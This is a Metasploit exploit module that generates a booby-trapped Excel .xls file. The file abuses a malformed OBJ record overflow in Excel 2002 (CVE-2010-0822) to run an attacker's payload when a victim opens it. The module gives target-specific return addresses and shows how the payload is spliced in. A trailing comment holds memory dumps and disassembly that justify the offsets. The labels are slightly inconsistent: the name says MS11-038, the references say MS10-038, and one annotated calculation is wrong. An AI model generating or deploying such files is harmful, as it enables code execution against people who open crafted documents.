##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info={})
		super(update_info(info,
			'Name'           => "MS11-038 Microsoft Office Excel Malformed OBJ Record Handling Overflow",
			'Description'    => %q{
					This module exploits a vulnerability found in Excel 2002 of Microsoft Office XP.
				By supplying a .xls file with a malformed OBJ (recType 0x5D) record an attacker
				can get the control of the excution flow. This results aribrary code execution under
				the context of the user.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Nicolas Joly', # Initial discovery
					'Shahin Ramezany <shahin[at]abysssec.com>', # MOAUB 24 exploit and binary analysis
					'juan vazquez'  # Metasploit
				],
			'References'     =>
				[
					['CVE', '2010-0822'],
					['OSVDB', '65236'],
					['BID', '40520'],
					['MSB', 'MS10-038'],
					['URL', 'http://www.exploit-db.com/moaub-24-microsoft-excel-obj-record-stack-overflow/']
				],
			'Payload'        =>
				{
					'Space' => 4000
				},
			'DefaultOptions'  =>
				{
					'ExitFunction'          => 'process',
					'DisablePayloadHandler' => 'true'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						# This is the one that can be downloaded from MSDN
						'Microsoft Office Excel 2002 10.2614.2625 Service Pack 0(Office XP) on Windows XP SP3',
						{
							'ftCmoReserved' => 0x307d91ac, # Ptr to CraftedPointer-4 in the stored contents on Excel .data
							'CraftedPointer' => 0x307d91a6, # Ptr to PtrToRet in the stored contents on Excel .data
							'PtrToRet' => 0x307d908e, # Ptr to Ret - 11Ch
							'Ret' => 0x30006113 # call ecx from Excel.exe 10.0.2614.0
						}
					],
					[
						'Microsoft Office Excel 2002 10.6501.6626 Service Pack 3 (Office XP SP3) on Windows XP SP3',
						{
							'ftCmoReserved' => 0x307de5ac, # Ptr to CraftedPointer-4 in the stored contents on Excel .data
							'CraftedPointer' => 0x307de5a6, # Ptr to PtrToRet in the stored contents on Excel .data
							'PtrToRet' => 0x307de48e, # Ptr to Ret - 11Ch
							'Ret' => 0x300061a5 # call ecx from Excel.exe 10.0.6501.0
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => "Jun 8 2010",
			'DefaultTarget'  => 1))

			register_options(
				[
					OptString.new('FILENAME', [true, 'The filename', 'msf.xls'])
				], self.class)
	end

	def exploit

		path = File.join(Msf::Config.install_root, 'data', 'exploits', 'CVE-2010-0822.xls')
		f = File.open(path, 'rb')
		template = f.read
		f.close
		buf  = ''
		buf << template[0..35016]
		buf << [target['ftCmoReserved']].pack('V')
		buf << template[35021..36549]
		buf << [target['PtrToRet']].pack('V')
		buf << [target.ret].pack('V')
		buf << template[36558..36559]
		buf << [target['CraftedPointer']].pack('V')
		buf << template[36564..36609]
		buf << [target['CraftedPointer']].pack('V') # Pass the MSO_804()
		buf << template[36614..36639]
		buf << payload.encoded
		buf << template[40640..template.length]
		file_create(buf)

	end

end

=begin

Memory analysis on Office XP SP2

'ftCmoReserved' => 0x307de5ac, # Ptr to CraftedPointer-4 in the stored contents on Excel .data
------------------------------------------------------------------------------------------

0:000> db 0x307de5ac
307de5ac  00 30 74 00 a6 e5 7d 30-4c 4c 00 55 6e 69 72 42  .0t...}0LL.UnirB
307de5bc  42 42 42 4c 00 48 50 44-6f 63 55 49 53 55 49 00  BBBL.HPDocUISUI.
307de5cc  54 72 75 65 00 52 65 73-6f 6c 75 74 69 6f 6e 00  True.Resolution.
307de5dc  36 30 30 64 70 69 a6 e5-7d 30 74 52 65 73 00 46  600dpi..}0tRes.F
307de5ec  61 6c 73 65 90 90 90 90-90 90 90 90 90 90 90 90  alse............
307de5fc  90 90 90 90 41 41 41 41-41 41 41 41 41 41 41 41  ....AAAAAAAAAAAA
307de60c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
307de61c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

'CraftedPointer' => 0x307de5a6, # Ptr to PtrToRet in the stored contents on Excel .data
-----------------------------------------------------------------------------------

0:000> db 0x307de5a6
307de5a6  8e e4 7d 30 a5 61 00 30-74 00 a6 e5 7d 30 4c 4c  ..}0.a.0t...}0LL
307de5b6  00 55 6e 69 72 42 42 42-42 4c 00 48 50 44 6f 63  .UnirBBBBL.HPDoc
307de5c6  55 49 53 55 49 00 54 72-75 65 00 52 65 73 6f 6c  UISUI.True.Resol
307de5d6  75 74 69 6f 6e 00 36 30-30 64 70 69 [[a6 e5 7d 30]]*  ution.600dpi..}0
307de5e6  74 52 65 73 00 46 61 6c-73 65 90 90 90 90 90 90  tRes.False......
307de5f6  90 90 90 90 90 90 90 90-90 90 41 41 41 41 41 41  ..........AAAAAA
307de606  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
307de616  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

* => 0x307de5a6 + 0x3c => 0x307de5e2

'PtrToRet' => 0x307de48e, # Ptr to Ret - 11Ch
---------------------------------------------

307de48e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de49e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de4ae  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de4be  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de4ce  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de4de  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de4ee  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de4fe  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de50e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de51e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de52e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de53e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de54e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de55e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de56e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de57e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de58e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
307de59e  eb 60 6e 00 50 72 69 6e-8e e4 7d 30 [[a5 61 00 30]]*  .`n.Prin..}0.a.0
307de5ae  74 00 a6 e5 7d 30 4c 4c-00 55 6e 69 72 42 42 42  t...}0LL.UnirBBB
307de5be  42 4c 00 48 50 44 6f 63-55 49 53 55 49 00 54 72  BL.HPDocUISUI.Tr
307de5ce  75 65 00 52 65 73 6f 6c-75 74 69 6f 6e 00 36 30  ue.Resolution.60
307de5de  30 64 70 69 a6 e5 7d 30-74 52 65 73 00 46 61 6c  0dpi..}0tRes.Fal
307de5ee  73 65 90 90 90 90 90 90-90 90 90 90 90 90 90 90  se..............
307de5fe  90 90 41 41 41 41 41 41-41 41 41 41 41 41 41 41  ..AAAAAAAAAAAAAA
307de60e  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
307de61e  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
307de62e  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
307de63e  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
307de64e  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
307de65e  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
307de66e  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
307de67e  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

* 0x307de48e + 0x11c => 0x307de48e

'Ret' => 0x300061a5 # call ecx from Excel.exe 10.0.6501.0
----------------------------------------------------------

EXCEL!Ordinal41+0x61a5:
300061a5 ffd1            call    ecx
300061a7 e00b            loopne  EXCEL!Ordinal41+0x61b4 (300061b4)
300061a9 c1536689        rcl     dword ptr [ebx+66h],89h
300061ad 46              inc     esi
300061ae 2a8d8574ffff    sub     cl,byte ptr [ebp-8B7Bh]
300061b4 ff5068          call    dword ptr [eax+68h]
300061b7 1200            adc     al,byte ptr [eax]
300061b9 0400            add     al,0

=end